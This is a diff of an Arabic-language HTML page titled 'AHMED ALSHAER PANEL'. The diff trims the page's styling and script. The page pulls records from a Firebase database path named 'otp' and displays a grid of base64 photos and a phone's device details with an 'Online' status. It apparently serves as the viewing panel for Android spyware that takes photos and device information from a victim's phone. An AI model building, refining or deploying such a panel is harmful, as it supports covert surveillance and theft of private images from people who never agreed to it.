@@ -1,90 +1,59 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>📱 AHMED ALSHAER PANEL</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:sans-serif;background:#0a0a0a;color:#fff;min-height:100vh;padding:15px}
-        h1{color:#25D366;text-align:center;margin:20px 0}
-        .tabs{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin:15px 0}
-        .tab{padding:12px 18px;background:#1a1a1a;border:2px solid #333;border-radius:10px;cursor:pointer;font-size:14px;font-weight:bold;color:#fff}
-        .tab.active{background:#25D366;color:#000}
-        .content{max-width:800px;margin:0 auto}
-        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px}
-        .item{background:#111;border:1px solid #222;border-radius:10px;padding:10px;text-align:center;cursor:pointer}
-        .item:hover{border-color:#25D366}
-        .item img{width:100%;height:150px;object-fit:cover;border-radius:8px}
-        .item .name{font-size:10px;color:#ccc;margin-top:5px;word-break:break-all}
-        .info-box{background:#111;border:2px solid #25D366;border-radius:15px;padding:25px}
-        .info-box p{margin:10px 0}
-        .info-box b{color:#25D366}
-        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:100;justify-content:center;align-items:center}
-        .modal img{max-width:90%;max-height:90%;border-radius:10px}
-        .modal .close{position:absolute;top:20px;right:20px;font-size:30px;color:#fff;cursor:pointer}
-    </style>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>📱 PANEL</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:sans-serif;background:#0a0a0a;color:#fff;padding:15px}
+h1{color:#25D366;text-align:center;margin:20px 0}
+.tabs{display:flex;gap:8px;justify-content:center;margin:15px 0}
+.tab{padding:12px 18px;background:#1a1a1a;border-radius:10px;cursor:pointer;font-weight:bold}
+.tab.active{background:#25D366;color:#000}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px;max-width:800px;margin:0 auto}
+.item{background:#111;border-radius:10px;padding:10px;text-align:center}
+.item img{width:100%;height:150px;object-fit:cover;border-radius:8px}
+.item p{font-size:11px;color:#ccc;margin-top:5px}
+.info{background:#111;border:2px solid #25D366;border-radius:15px;padding:25px;text-align:center;max-width:400px;margin:0 auto}
+.info p{margin:10px 0}
+.info b{color:#25D366}
+</style>
 </head>
 <body>
-    <h1>📱 AHMED ALSHAER PANEL</h1>
-    
-    <div class="tabs">
-        <div class="tab active" onclick="showTab('photos',this)">📸 الصور</div>
-        <div class="tab" onclick="showTab('info',this)">📊 الجهاز</div>
-    </div>
-    
-    <div class="content" id="content"></div>
-    
-    <div class="modal" id="modal" onclick="this.style.display='none'">
-        <span class="close">×</span>
-        <img id="modalImg" src="">
-    </div>
+<h1>📱 AHMED ALSHAER PANEL</h1>
+<div class="tabs">
+<div class="tab active" onclick="show('photos',this)">📸 الصور</div>
+<div class="tab" onclick="show('info',this)">📊 الجهاز</div>
+</div>
+<div id="content"></div>
 
-    <script>
-        let allData = {photos: [], device: null};
-        
-        fetch('https://otp-5acda-default-rtdb.firebaseio.com/panel.json')
-            .then(r => r.json())
-            .then(data => {
-                if (!data) return;
-                Object.values(data).forEach(e => {
-                    if (e.type === 'photos') allData.photos = e.data;
-                    if (e.type === 'device') allData.device = e.data;
-                });
-                showTab('photos', document.querySelector('.tab'));
-            });
-        
-        function showTab(tab, el) {
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            el.classList.add('active');
-            const c = document.getElementById('content');
-            
-            if (tab === 'photos') {
-                c.innerHTML = allData.photos.length ? 
-                    '<div class="grid">' + allData.photos.map(p => `
-                        <div class="item" onclick="openImage('${p.base64}')">
-                            <img src="${p.base64}">
-                            <div class="name">${p.name}</div>
-                        </div>
-                    `).join('') + '</div>' : '<p style="color:#888;text-align:center">لا توجد صور</p>';
-            }
-            else if (tab === 'info') {
-                c.innerHTML = allData.device ? 
-                    '<div class="info-box">' +
-                    '<p>📱 <b>' + allData.device.device + '</b></p>' +
-                    '<p>🏷️ ' + allData.device.brand + '</p>' +
-                    '<p>🤖 Android ' + allData.device.android + '</p>' +
-                    '<p>💾 RAM: ' + allData.device.ram + '</p>' +
-                    '<p>🔋 ' + allData.device.battery + '</p>' +
-                    '<p>🟢 Online</p>' +
-                    '</div>' : '<p style="color:#888;text-align:center">لا توجد معلومات</p>';
-            }
-        }
-        
-        function openImage(src) {
-            document.getElementById('modalImg').src = src;
-            document.getElementById('modal').style.display = 'flex';
-        }
-    </script>
+<script>
+let photos = [];
+let device = null;
+
+fetch('https://otp-5acda-default-rtdb.firebaseio.com/panel.json')
+.then(r => r.json())
+.then(data => {
+    if (data && data.photos) photos = data.photos;
+    if (data && data.device) device = data.device;
+    show('photos', document.querySelector('.tab'));
+});
+
+function show(tab, el) {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    el.classList.add('active');
+    
+    if (tab === 'photos') {
+        document.getElementById('content').innerHTML = photos.length ?
+            '<div class="grid">' + photos.map(p => `
+                <div class="item"><img src="${p.base64}" onerror="this.style.display='none'"><p>${p.name}</p></div>
+            `).join('') + '</div>' :
+            '<p style="color:#888;text-align:center">لا توجد صور</p>';
+    } else {
+        document.getElementById('content').innerHTML = device ?
+            '<div class="info"><p>📱 <b>' + device.device + '</b></p><p>🤖 Android ' + device.android + '</p><p>🟢 Online</p></div>' :
+            '<p style="color:#888;text-align:center">لا توجد معلومات</p>';
+    }
+}
+</script>
 </body>
 </html>
